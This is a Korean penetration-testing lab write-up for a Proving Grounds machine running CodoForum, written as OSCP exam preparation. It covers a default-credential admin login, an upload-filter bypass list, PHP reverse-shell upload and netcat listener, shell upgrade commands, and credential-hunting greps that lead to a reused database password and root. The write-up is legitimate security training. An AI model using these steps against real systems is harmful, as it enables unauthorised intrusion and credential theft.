---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/default-creds
  - tech/web/file-upload
  - tech/cred/reuse
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.243.23
ports: [22, 80]
services: [http, ssh]
cves: [CVE-2018-15473]
status: solved
manual_tags: true
tech_count: 4
---

> [!info] PG Practice — Pentester Foundations
> **타겟** 192.168.243.23 · **OS** Ubuntu (`codo`, 5.4.0-150-generic) · **난이도** Fundamental · **플래그 1개**
> **경로 요약** 80 CodoForum(CODOLOGIC) → `/admin/index.php` **기본 자격증명 `admin:admin`** → 관리자 기능으로 PHP 웹셸 업로드 → `sites/default/assets/img/attachments/payload.php` 호출로 리버스셸 → `www-data` → `sites/default/config.php`의 **DB 비밀번호 `FatPanda123`** → **`su root`에 그대로 통함(자격증명 재사용)** → root

## 0. 이 박스에서 배우는 것

- **기본 자격증명(default credentials)이 왜 첫 시도인가** — 로그인 폼을 보면 브루트포스보다 `admin:admin`이 먼저다
- **인증 후 파일 업로드 → RCE** — CMS/포럼 관리자 패널의 고전 경로. "인증이 필요하다"는 방어가 아니다
- **업로드된 파일이 어디에 떨어지는지 찾아내는 법** — 응답이 알려주는 경우와 안 알려주는 경우
- **자격증명 재사용(credential reuse)** — DB 비밀번호가 시스템 root 비밀번호와 같다. **이 박스의 핵심이자 OSCP 시험 단골**
- **셸을 잡으면 설정 파일부터 훑는 이유** — 웹 애플리케이션 설정 파일은 평문 비밀번호의 창고다
- **`su`로 비밀번호를 시험하는 것과 SSH로 시험하는 것의 차이** — TTY 요구, 로그, `PermitRootLogin` 제약

> [!tip] 시험 출제 가능성 — **매우 높다**
> **자격증명 재사용은 OSCP 시험에서 가장 자주 나오는 권한상승 경로 중 하나다.** SUID·커널 익스플로잇보다 흔하다.
> 시험 박스의 전형적 형태는 셋 중 하나다:
> 1. **웹앱 설정 파일의 DB 비밀번호 → OS 계정 비밀번호** ← **이 박스**
> 2. 백업 파일·메모·`.bash_history`의 비밀번호 → SSH 재사용
> 3. 서비스 유닛 파일·크론 스크립트에 박힌 평문 비밀번호 → `su`
>
> 세 경우 모두 **"찾는 것"이 기술이지 "익스플로잇"이 아니다.** 그래서 익스플로잇 실력이 아니라 **열거 체크리스트의 완성도**가 점수를 가른다.
> 같은 계열: [[Fanatastic]](DB 사용자명 = OS 계정명) · [[Levram]](`app.service`에 평문 root 비밀번호) · [[Crane]](`config.php`에서 DB 자격증명)

---

## 1. 정찰

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Codo]
└─$ nnmap 192.168.243.23
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-18 16:02 +0900
Nmap scan report for 192.168.243.23
Host is up (0.084s latency).
Not shown: 65533 filtered tcp ports (no-response)
Bug in http-generator: no string output.
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: All topics | CODOLOGIC
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   83.98 ms 192.168.45.1
2   83.94 ms 192.168.45.254
3   84.59 ms 192.168.251.1
4   84.63 ms 192.168.243.23

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.27 seconds

```

> [!warning] 기록된 명령줄과 출력이 어긋난다 — 노트를 쓸 때 조심할 점
> 적힌 명령은 `nnmap 192.168.243.23`(오타)인데, 출력에는 **버전 배너(`-sV`)·NSE 스크립트(`ssh-hostkey`·`http-cookie-flags`)·OS 탐지(`-O`)·전 포트(`Not shown: 65533`)·`TRACEROUTE`** 가 전부 들어 있다.
> 기본 `nmap <IP>`로는 이 중 어느 것도 나오지 않는다. **[가정]** 실제로는 `sudo nmap -sCV -p- -Pn -A --min-rate 5000` 계열을 돌리고 노트에 옮겨 적을 때 명령줄만 잘못 붙인 것이다.
> 교훈은 두 가지다 — **① 명령은 셸 히스토리에서 그대로 복사해라.** 시험 보고서에서 명령과 출력이 안 맞으면 재현성 지적을 받는다. **② `-oN nmap.log`로 파일에 남겨라.** 스크롤백은 사라진다.

### 이 스캔에서 읽어야 할 것

| 줄 | 의미 |
|---|---|
| `Not shown: 65533 filtered tcp ports (no-response)` | **전 포트를 봤고 열린 건 딱 2개**다. 숨은 고번호 웹 포트가 없다는 확정 — [[Hawat]]처럼 50080·17445에 웹이 숨어 있을 가능성이 배제된다 |
| `22/tcp OpenSSH 8.2p1 Ubuntu 4ubuntu0.7` | **패키지 리비전이 배포판을 확정해준다.** `8.2p1 Ubuntu 4ubuntu0.x` = **Ubuntu 20.04 focal**. OS 추측 블록(`JUST GUESSING`)보다 이 배너 하나가 훨씬 정확하다 |
| `80/tcp Apache httpd 2.4.41 ((Ubuntu))` | Apache 2.4.41 역시 Ubuntu 20.04 기본 패키지. 두 배너가 **독립 근거 2개**로 서로를 확증한다 |
| `PHPSESSID` 쿠키 | **PHP 애플리케이션**이다. 확장자·업로드·LFI 후보가 전부 PHP 문법으로 좁혀진다 |
| `http-title: All topics \| CODOLOGIC` | **제품 식별.** "All topics"는 포럼의 인덱스 제목, `CODOLOGIC`은 벤더명 |
| `Warning: OSScan results may be unreliable` / `Running (JUST GUESSING)` | 열린 포트만 있고 닫힌 포트가 없어 OS 지문이 무의미하다. **`MikroTik RouterOS 97%`를 믿고 라우터 익스플로잇을 찾으러 가면 시간을 통째로 날린다** |

> [!danger] 포트가 22와 80뿐이면 공격면은 웹 하나다
> SSH 8.2p1에는 실전 원격 취약점이 없다(사용자 열거 CVE-2018-15473은 7.7에서 수정됨). **SSH는 "나중에 자격증명이 생기면 쓸 문**이지 진입점이 아니다.
> 즉 **80 하나에 모든 시간을 쓴다**는 판단을 스캔 45초 만에 내릴 수 있다. 이 판단이 Fundamental 난이도 박스에서 가장 중요한 시간 관리다.

### 제품 식별 — CODOLOGIC = CodoForum

`CODOLOGIC`은 PHP 포럼 소프트웨어 **CodoForum**의 벤더다. 나중에 셸에서 확인되는 웹루트 구조가 이를 확증한다:

```
/var/www/html/sites/default/{config.php, constants.php, themes, plugins, locale, logs, assets}
```

`sites/default/` 레이아웃과 `config.php` 안의 `IN_CODOF`·`get_codo_db_conf()`·`@CODOLICENSE` 가 **CodoForum이 맞다는 코드 수준 근거**다.

> [!warning] **버전을 특정하지 못한 채로 진행했다** — 이 노트의 가장 큰 공백
> 원문에는 CodoForum의 **버전 번호를 확인한 기록이 없다.** 결과적으로 기본 자격증명이 통해서 문제가 안 됐지만, 그게 안 통했다면 버전 없이는 다음 수가 없다.
> 버전을 뽑는 독립 경로 (표준 문서의 "버전 판정은 독립 근거 2개" 원칙):
> ```bash
> curl -s http://192.168.243.23/ | grep -iE 'generator|codoforum|version|/assets/.*\?v='
> curl -s http://192.168.243.23/readme.txt              # 배포본에 동봉되는 경우
> curl -s http://192.168.243.23/CHANGELOG.txt
> curl -s -I http://192.168.243.23/sites/default/config.php.example
> ```
> **셸을 잡은 뒤의 `ls` 출력에 `readme.txt`가 실제로 보인다**(4장 참조). 웹에서도 같은 파일이 노출됐을 가능성이 높고, 그랬다면 스캔 직후 1분 안에 버전이 나왔다.
> 같은 함정: [[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]] — **버전은 근거 2개로 못 박고 시작한다.**

### 디렉터리 열거

관리자 패널 경로를 찾는 단계다. PHP CMS/포럼의 관리 경로는 관례가 좁다:

```bash
# 관례 목록을 먼저 손으로 찔러본다 — 스캐너보다 빠르다
for p in admin admin/index.php administrator panel manage backend cms wp-admin; do
  printf '%-20s %s\n' "$p" "$(curl -s -o /dev/null -w '%{http_code}' http://192.168.243.23/$p)"
done

# 그래도 안 나오면 확장자를 지정해 전수
gobuster dir -u http://192.168.243.23/ -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html -t 40 -o gobuster.log
```

| 플래그 | 역할 · 빼면 어떻게 되는가 |
|---|---|
| `-x php,txt,html` | 확장자를 붙여 시도. **빼면 `index.php`·`readme.txt`를 통째로 놓친다.** PHPSESSID를 봤으면 `php`는 필수 |
| `-t 40` | 스레드. 기본 10이면 랩 지연 84ms에서 체감상 4배 느리다 |
| `-o gobuster.log` | 파일 저장. 스크롤백은 증거가 안 된다 |
| `-w common.txt` | 1차는 작은 사전. **큰 사전은 안 나올 때 두 번째로.** 순서를 뒤집으면 시간을 태운다 |

이 박스에서 실제로 접근한 경로는 **`/admin/index.php`** 다.

---

## 2. 취약점 분석

### 2-1. 배경 — 기본 자격증명은 "취약점"인가

그렇다. OWASP 분류로는 **A07: Identification and Authentication Failures / A05: Security Misconfiguration**에 해당하고, CWE로는 **CWE-1392(Use of Default Credentials)** 다. CVE 번호가 없다고 해서 등급이 낮은 것이 아니다 — **실제 침해 사고의 최상위 원인**이다.

> [!note] 왜 기본 자격증명이 브루트포스보다 **먼저**인가
> | | 기본 자격증명 | 브루트포스 |
> |---|---|---|
> | 요청 수 | **5~10회** | 수천~수십만 회 |
> | 소요 시간 | **1분** | 수십 분~시간 |
> | 계정 잠금 위험 | 거의 없음 | **높다** (잠기면 그 박스는 끝) |
> | 탐지 | 로그 몇 줄 | IDS/WAF 확정 탐지 |
> | 시험 규정 | 제한 없음 | 로그인 브루트포스는 **시험에서 사실상 금지에 가깝다**(제한적 허용, 시간만 태운다) |
>
> **기대값이 압도적으로 다르다.** 로그인 폼을 만나면 순서는 고정이다:
> 1. **제품별 문서상 기본값** (제품을 식별했으면 이게 1순위)
> 2. `admin:admin` · `admin:password` · `admin:123456` · `administrator:administrator`
> 3. **정찰에서 주운 것** — 페이지 하단 이메일, 팀 소개, `robots.txt`, 커밋 로그의 이름
> 4. 그래도 없으면 **그때** 짧은 사전으로 스프레이

### 2-2. 제품별 기본값 — 시험장에서 바로 쓰는 표

| 제품 | 기본 자격증명 | 관리 경로 |
|---|---|---|
| **CodoForum** | 설치 시 관리자 지정 — **`admin:admin`은 "게으른 설치"의 산물**(이 박스) | `/admin/index.php` |
| Tomcat Manager | `tomcat:tomcat`, `admin:admin`, `tomcat:s3cret` | `/manager/html` |
| Jenkins | 초기 비인증 또는 `admin:admin` | `/`, `/script` |
| phpMyAdmin | `root:` (빈 비밀번호) | `/phpmyadmin` |
| Grafana | `admin:admin` | `/login` |
| Zabbix | `Admin:zabbix` | `/zabbix` |
| Jboss/WildFly | `admin:admin` | `/console` |
| Webmin | 설치 시 root 계정 | `:10000` |
| PRTG | `prtgadmin:prtgadmin` | `/index.htm` |
| GitLab | `root:5iveL!fe`(구버전) | `/users/sign_in` |

> [!tip] 노트에 없는 제품을 만났을 때
> ```bash
> searchsploit <제품명> | grep -i default
> curl -s "https://www.google.com/search?q=<제품명>+default+credentials"   # 시험 중 검색은 허용된다
> ```
> **제품명 + "default password"** 검색은 익스플로잇 검색보다 회수율이 높다. 검색 순서를 이렇게 잡아라.

### 2-3. 로그인

`/admin/index.php` 에 접근한 뒤 **`admin/admin`** 으로 로그인이 성립했다.

수동 확인(브라우저 없이 성패를 판정하는 방법):

```bash
curl -s -i -c cj.txt -X POST \
  -d 'username=admin&password=admin' \
  http://192.168.243.23/admin/index.php | head -20
```

> [!warning] **HTTP 200이 실패를 뜻할 수 있다** — 응답 코드로만 판정하지 마라
> 로그인 실패 시 폼을 다시 렌더하면 **200**이고, 성공 시 대시보드로 보내면 **302**다. 즉 이 계열 앱에서는 **302가 성공**이다.
> 판정은 세 가지를 함께 본다: **① 상태 코드 ② `Location:` 헤더 ③ `Set-Cookie`로 세션이 새로 발급됐는가.**
> 누적 중인 패턴 — "응답이 성공을 뜻하지 않는다": [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]]

### 2-4. 인증 후 파일 업로드 → RCE

관리자 세션을 얻으면 **관리자 기능 자체가 익스플로잇**이 된다. 포럼/CMS 관리 패널에는 거의 항상 다음 중 하나가 있다:

| 기능 | RCE로 가는 경로 |
|---|---|
| **첨부/미디어 업로드** | 확장자 필터를 뚫고 `.php` 업로드 ← **이 박스** |
| 테마/템플릿 편집기 | 템플릿에 PHP 코드 삽입 후 페이지 렌더 |
| 플러그인 업로드 | `.zip` 안에 웹셸 |
| 백업/복원 | 임의 경로에 파일 쓰기 |
| 로그 뷰어 + LFI | 로그에 PHP 주입 후 포함 |

> [!note] 왜 업로드가 곧 RCE인가 — 조건 3개
> 파일을 올릴 수 있다고 전부 RCE가 되지는 않는다. **셋이 동시에 성립해야** 한다:
> 1. **`.php` 확장자가 저장된다** — 필터가 없거나, 우회 가능하거나, 서버가 이중 확장자를 PHP로 넘긴다
> 2. **저장 위치가 웹루트 아래에 있다** — URL로 도달 가능해야 한다
> 3. **그 디렉터리에서 PHP 실행이 막혀 있지 않다** — `.htaccess`의 `php_admin_flag engine off`나 `<FilesMatch>` 차단이 없어야 한다
>
> 이 박스는 셋 다 성립했다. 3번을 막는 것이 방어 측에서 가장 값싼 조치인데(8장), **업로드 디렉터리에 실행 차단을 걸지 않는 것이 실무의 기본값**이다.

업로드 화면:

![[Pasted image 20260818163517.png]]

> [!warning] 업로드가 막혔을 때의 우회 사다리 — 위에서부터 순서대로
> 1. **그냥 `.php`** — 놀랍도록 자주 통한다. 먼저 시도할 것
> 2. **대체 확장자** — `.php3` `.php4` `.php5` `.php7` `.phtml` `.phar` `.inc` (Apache의 `AddType` 설정이 넓게 잡혀 있으면 전부 실행된다)
> 3. **대소문자** — `.PHP` `.pHp` (블랙리스트가 소문자만 볼 때)
> 4. **이중 확장자** — `shell.php.jpg` / `shell.jpg.php`
> 5. **널바이트** — `shell.php%00.jpg` (PHP 5.3 미만)
> 6. **Content-Type만 위조** — `image/jpeg`로 바꿔 MIME 검사만 통과
> 7. **매직바이트 + PHP** — 파일 앞에 `GIF89a;`를 붙이고 뒤에 `<?php ... ?>` (`getimagesize()` 검사 우회)
> 8. **`.htaccess` 업로드** — `AddType application/x-httpd-php .jpg` 를 올려 `.jpg`를 PHP로 실행시킨다
>
> [[Exfiltrated]]는 4·5번 계열(`.phar`), [[Squid]]는 파일 쓰기 경로 자체를 바꾸는 계열이다.

### 2-5. 업로드 웹셸의 **경로를 찾는 법** — 이 단계가 실전에서 가장 자주 막힌다

파일을 올리는 데 성공해도 **URL을 모르면 실행할 수 없다.** 이 박스의 실제 경로는 다음과 같다:

```
http://192.168.243.23/sites/default/assets/img/attachments/payload.php
```

`sites/default/assets/img/attachments/` — **CodoForum의 첨부 저장 디렉터리**다. 찾는 순서는 이렇다:

**① 응답이 알려주는 경우 (가장 흔하다 — 여기부터 본다)**

```bash
# 업로드 응답 본문에 경로가 그대로 들어 있는 경우가 많다 (JSON 응답이 특히 그렇다)
#   {"status":"ok","url":"/sites/default/assets/img/attachments/payload.php"}
# 브라우저에서는 업로드 직후 표시되는 썸네일/링크의 href·src를 본다
curl -s http://192.168.243.23/<업로드된_글> | grep -oE '(src|href)="[^"]*attachments[^"]*"'
```

- 업로드 성공 화면의 **미리보기 이미지 URL**
- 글에 삽입된 **첨부 링크의 `href`**
- 관리자 패널의 **파일 매니저/미디어 라이브러리** 목록
- HTTP **`Location:` 헤더**

**② 응답이 안 알려주는 경우**

```bash
# 제품 문서·소스에서 업로드 경로 관례를 찾는다 (오프라인으로도 가능)
searchsploit -m <exploit-id>            # 공개 익스플로잇에 경로가 하드코딩돼 있다
git clone <제품 저장소> && grep -rn "upload_dir\|move_uploaded_file\|attachments" .

# 관례 경로를 직접 두드린다
for d in uploads upload files media attachments images img \
         sites/default/assets/img/attachments assets/uploads wp-content/uploads; do
  printf '%-45s %s\n' "$d" "$(curl -s -o /dev/null -w '%{http_code}' http://192.168.243.23/$d/)"
done

# 디렉터리 인덱싱이 켜져 있으면 그대로 보인다 (403이 아니라 200 + 목록)
curl -s http://192.168.243.23/sites/default/assets/img/attachments/
```

| 제품군 | 업로드 관례 경로 |
|---|---|
| CodoForum | `sites/default/assets/img/attachments/` |
| WordPress | `wp-content/uploads/YYYY/MM/` |
| Joomla | `images/`, `tmp/` |
| Drupal | `sites/default/files/` |
| phpBB | `files/`, `images/avatars/upload/` |
| Laravel | `storage/app/public/`, `public/uploads/` |
| Tomcat | `webapps/<앱>/` (WAR 배포) |

> [!danger] 파일명이 서버에서 바뀌는 경우 — 이때가 진짜 함정이다
> 많은 CMS가 업로드 파일명을 **해시·타임스탬프·랜덤**으로 바꿔 저장한다. 그러면 `payload.php`로 두드려도 404다.
> **404를 "업로드 실패"로 오독하면 여기서 30분을 잃는다.**
> 대응:
> - 응답 본문/DOM에서 실제 파일명을 찾는다 (①로 되돌아간다)
> - 디렉터리 인덱싱이 켜져 있으면 목록에서 확인
> - 관리자 패널의 첨부 관리 화면에서 확인
> - 그래도 안 되면 **경로를 통제할 수 있는 다른 기능**(테마 편집기·백업 복원)으로 갈아탄다
>
> 이 박스는 **파일명이 유지된 쉬운 케이스**다. 시험에서는 그렇지 않을 것으로 가정하고 접근하라.

---

## 3. Foothold — 웹셸에서 리버스셸로

### 3-1. 리스너를 먼저 띄운다

```bash
┌──(kali㉿kali)-[~/PG/Codo]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
```

| 플래그 | 역할 · 빼면 어떻게 되는가 |
|---|---|
| `rlwrap` | **readline 래핑.** 방향키 히스토리·백스페이스·Ctrl+A가 살아난다. 빼면 `^[[A` 같은 이스케이프가 그대로 찍혀 오타를 고칠 수 없다 |
| `-l` | 리슨 모드 |
| `-n` | DNS 역조회 안 함. **빼면 접속 순간 수 초 멈춘다** |
| `-v` | 접속 정보 출력. 빼면 붙었는지 모른다 |
| `-p 4444` | 포트 지정 |

> [!tip] 순서를 절대 뒤집지 마라
> **리스너 → 페이로드 호출** 순이다. 반대로 하면 페이로드가 `Connection refused`로 죽고, "웹셸이 안 먹힌다"는 잘못된 결론에 도달한다.
> 리스너는 `tmux`로 띄워두면 세션이 끊겨도 살아 있다: `tmux new-session -d -s codo 'rlwrap nc -lnvp 4444'`

### 3-2. 페이로드 호출

```
http://192.168.243.23/sites/default/assets/img/attachments/payload.php
```

브라우저 주소창에 넣거나 `curl`로 호출하면 된다. **호출하는 순간 페이지가 멈춘 것처럼 보이는데, 그게 정상이다** — 리버스셸이 붙어 있는 동안 PHP 요청이 끝나지 않기 때문이다.

### 3-3. 셸 획득

```bash
┌──(kali㉿kali)-[~/PG/Codo]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.243.23] 34576
Linux codo 5.4.0-150-generic #167-Ubuntu SMP Mon May 15 17:35:05 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 07:35:51 up 36 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1112): Inappropriate ioctl for device
bash: no job control in this shell
www-data@codo:/$ whoami
whoami
www-data
```

> [!note] **배너를 읽으면 어떤 웹셸을 썼는지가 나온다** — 원문 기록에 없어도 복원할 수 있다
> 접속 직후 출력 순서가 **`uname -a` → `w` → `id` → 셸**이다. 이건 pentestmonkey의 **`php-reverse-shell.php`** 가 내부에 가진
> `$shell = 'uname -a; w; id; /bin/sh -i';` 문자열의 실행 결과와 정확히 일치한다.
> **[가정]** 업로드한 `payload.php`는 pentestmonkey `php-reverse-shell.php`(또는 그 파생본)이며, `$shell`의 `/bin/sh`가 `/bin/bash`로 바뀐 판본이다 — 이어지는 `bash:` 에러와 `www-data@codo:/$` 프롬프트가 bash이기 때문이다.
> 칼리 경로: `/usr/share/webshells/php/php-reverse-shell.php`. 쓰기 전에 **`$ip`와 `$port` 두 줄을 반드시 고쳐야 한다.**

> [!warning] `bash: cannot set terminal process group` / `no job control` — **에러가 아니다**
> PTY(의사 터미널)가 없는 셸이라는 뜻일 뿐이고, 명령은 정상 실행된다. 실제로 바로 아래 `whoami`가 동작한다.
> 다만 **PTY가 없으면 못 하는 것들**이 있다:
> - `Ctrl+C`를 누르면 **셸 전체가 죽는다** (리스너까지 끊긴다)
> - `su` · `ssh` · `passwd` · `sudo`(설정에 따라) 가 **"must be run from a terminal"로 거부**된다 ← **4장에서 결정적**
> - `vi`·`nano`·`top` 같은 화면 기반 프로그램이 깨진다
> - 탭 완성·히스토리 없음
>
> **셸을 잡으면 반사적으로 PTY부터 올린다:**
> ```bash
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> # python3이 없으면
> script -qc /bin/bash /dev/null
> perl -e 'exec "/bin/bash";'
> # 그 다음 완전 업그레이드 (Ctrl+Z로 빠져나와서)
> stty raw -echo; fg
> export TERM=xterm; stty rows 50 columns 200
> ```
> `python3`이 없어 `script`로 넘어간 사례: [[Hawat]]

`connect to [192.168.45.207] from ... [192.168.243.23] 34576` — 왼쪽이 **내 VPN IP(tun0)**, 오른쪽이 타겟과 타겟의 **소스 포트**다.

> [!danger] 리버스셸이 안 붙으면 무엇을 의심하나
> 1. **리스너 IP가 틀렸다** — `eth0`가 아니라 **`tun0`의 IP**여야 한다. `ip a show tun0` 로 확인. 가장 흔한 실수다
> 2. **아웃바운드 포트가 막혔다** — 4444가 안 되면 **443 · 80 · 53**을 시도한다([[Hawat]]에서 실제로 4444가 죽고 443만 살아 있었다). 1024 미만은 리스너에 `sudo` 필요
> 3. **칼리 방화벽** — `sudo ufw status`
> 4. **페이로드의 IP/포트를 안 고쳤다** — `php-reverse-shell.php`는 기본값이 `127.0.0.1:1234`다
> 5. **셸 바이너리가 없다** — `/bin/bash`가 없으면 `/bin/sh`로

---

## 4. 권한상승 — 자격증명 재사용

### 4-1. 셸을 잡자마자 치는 5개

원문에는 `whoami`만 남아 있지만, **표준 반사는 다음과 같다.** 순서를 외워두면 30초 만에 끝난다:

```bash
id                                          # 그룹이 곧 권한이다 (docker/lxd/disk/adm/sudo)
sudo -l                                     # 비밀번호 없이 되는 게 있는가
find / -perm -4000 -type f 2>/dev/null      # SUID
getcap -r / 2>/dev/null                     # capabilities
cat /etc/crontab; ls -la /etc/cron.*        # 크론
```

이 박스의 `id`는 `uid=33(www-data) gid=33(www-data) groups=33(www-data)` — **특별한 그룹이 없다.** 즉 위 5개는 전부 빈손이다.

> [!tip] **www-data로 떨어졌으면 6번째 명령이 있다 — 웹루트 뒤지기**
> 웹 서비스 계정으로 셸을 잡았다는 것은 **웹 애플리케이션의 파일을 전부 읽을 수 있다**는 뜻이다.
> `www-data`는 SUID·크론이 걸릴 일이 거의 없는 계정이라, **다섯 개보다 설정 파일이 먼저 나오는 경우가 훨씬 많다.** 이 박스가 정확히 그 경우다.

### 4-2. 설정 파일을 찾는다

```bash
www-data@codo:/var/www/html/sites/default$ ls
ls
assets
config.php
config.php.example
constants.php
locale
logs
plugins
readme.txt
themes
```

> [!note] 이 `ls` 출력에서 읽어야 할 것
> - **`config.php`** — 본체. 실제 자격증명이 여기 있다
> - **`config.php.example`** — 배포본 원본. **`diff config.php config.php.example` 하면 관리자가 무엇을 바꿨는지가 그대로 드러난다.** 커스터마이즈된 값만 뽑아내는 지름길
> - **`readme.txt`** — **버전이 적혀 있을 가능성이 높다.** 1장에서 못 박지 못한 버전을 여기서 확정할 수 있었다
> - **`logs/`** — 웹 애플리케이션 로그. LFI가 있었다면 로그 포이즈닝 대상이 되는 디렉터리
> - **`plugins/`, `themes/`** — 다른 RCE 경로(플러그인/테마 업로드)의 목적지

### 4-3. 웹 애플리케이션 설정 파일 위치 관례 — 시험장에서 바로 쓰는 표

**프레임워크마다 비밀번호가 사는 파일 이름이 정해져 있다.** 이걸 외우고 있으면 `find` 없이 바로 `cat` 할 수 있다:

| 스택 | 설정 파일 | 흔한 위치 |
|---|---|---|
| **CodoForum** | `config.php` | `<웹루트>/sites/default/config.php` ← **이 박스** |
| WordPress | `wp-config.php` | `<웹루트>/wp-config.php` |
| Drupal | `settings.php` | `<웹루트>/sites/default/settings.php` |
| Joomla | `configuration.php` | `<웹루트>/configuration.php` |
| Magento | `env.php` | `app/etc/env.php` |
| Laravel / Symfony / 범용 | **`.env`** | 프로젝트 루트 (`.env`는 숨김 파일이라 `ls -la`로 봐야 한다) |
| Django | `settings.py`, `local_settings.py` | `<프로젝트>/<앱>/settings.py` |
| Rails | `config/database.yml`, `config/secrets.yml` | 프로젝트 루트 |
| Spring Boot | `application.properties`, `application.yml` | `src/main/resources/`, jar 내부 |
| Node.js | `config.json`, `.env`, `ecosystem.config.js` | 프로젝트 루트 |
| ASP.NET | `web.config`, `appsettings.json` | 앱 루트 |
| Tomcat | `tomcat-users.xml` | `/etc/tomcat*/`, `$CATALINA_HOME/conf/` |
| phpMyAdmin | `config.inc.php` | `/etc/phpmyadmin/`, `<웹루트>/phpmyadmin/` |

**표에 없는 제품을 만났을 때의 전수 검색:**

```bash
# ① 이름으로 찾는다
find / -name "config*.php" 2>/dev/null
find / \( -name ".env" -o -name "*.yml" -o -name "*.ini" -o -name "settings.py" \
       -o -name "web.config" -o -name "application*.properties" \) 2>/dev/null | grep -v -E '^/(proc|sys|usr/share)'

# ② 내용으로 찾는다 — 이쪽이 회수율이 더 높다
grep -rn "password" /var/www --include="*.php" 2>/dev/null
grep -rniE "pass(word|wd)?\s*[=:>]|DB_PASS|secret|api[_-]?key" /var/www 2>/dev/null | head -50

# ③ 숨김 파일을 놓치지 마라
ls -la /var/www/html /home/* /opt/* 2>/dev/null
cat /home/*/.bash_history /root/.bash_history 2>/dev/null

# ④ 백업본에도 같은 값이 산다
find / \( -name "*.bak" -o -name "*.old" -o -name "*~" -o -name "*.save" -o -name "*.orig" \) 2>/dev/null
```

| 플래그 | 역할 · 빼면 어떻게 되는가 |
|---|---|
| `2>/dev/null` | **필수.** 빼면 `Permission denied`가 수천 줄 쏟아져 진짜 결과가 묻힌다. www-data는 대부분의 디렉터리에 접근 못 한다 |
| `--include="*.php"` | 검색 대상 한정. 빼면 바이너리·이미지까지 뒤져 몇 분씩 걸리고 이진 매칭 잡음이 섞인다 |
| `-r` | 재귀 |
| `-n` | 행 번호. 보고서에 근거 위치를 적을 때 필요 |
| `-i` | 대소문자 무시. `Password`·`PASSWORD`·`passwd`를 함께 잡는다 |
| `grep -v -E '^/(proc\|sys...'` | 가상 파일시스템 제외. 빼면 `/proc` 순회로 결과가 오염된다 |

### 4-4. 자격증명 확보

```bash
www-data@codo:/var/www/html/sites/default$ cat config.php
cat config.php
<?php

/*
 * @CODOLICENSE
 */

defined('IN_CODOF') or die();

$CF_installed=true;

function get_codo_db_conf() {


    $config = array (
  'driver' => 'mysql',
  'host' => 'localhost',
  'database' => 'codoforumdb',
  'username' => 'codo',
  'password' => 'FatPanda123',
  'prefix' => '',
  'charset' => 'utf8',
  'collation' => 'utf8_unicode_ci',
);

    return $config;
}

$DB = get_codo_db_conf();

$CONF = array (

  'driver' => 'Custom',
  'UID'    => '631042af544ef',
  'SECRET' => '631042af544f0',
  'PREFIX' => ''
);
```

| 값 | 무엇에 쓰는가 |
|---|---|
| `'username' => 'codo'` | MySQL 계정명. **동시에 OS 계정 후보**다 — `/etc/passwd`에 `codo`가 있는지 반드시 확인 |
| **`'password' => 'FatPanda123'`** | MySQL 비밀번호. **이 박스의 열쇠** |
| `'host' => 'localhost'` | DB가 로컬. 외부에서 3306으로 붙을 수 없다(nmap에도 안 보였다). 쓰려면 셸 안에서 `mysql -u codo -p` |
| `'database' => 'codoforumdb'` | 여기에 포럼 사용자들의 **비밀번호 해시**가 있다 — 재사용 후보의 또 다른 공급원 |
| `UID`/`SECRET` | 애플리케이션 내부 식별자. 세션 위조·토큰 서명에 쓰일 수 있으나 이 박스에서는 불필요 |

> [!danger] `defined('IN_CODOF') or die();` — **웹으로 직접 요청하면 빈 응답이 온다**
> 이 한 줄 때문에 `http://192.168.243.23/sites/default/config.php` 를 브라우저로 열면 **200에 0바이트**가 돌아온다. "파일이 없다"가 아니라 **"PHP가 파싱하고 즉시 종료했다"**는 뜻이다.
> 애초에 `.php`는 서버가 실행해버리므로 소스가 안 보이는 게 정상이다. **설정 파일을 읽으려면 LFI(PHP 필터)·트래버설·셸 중 하나가 필요하다.**
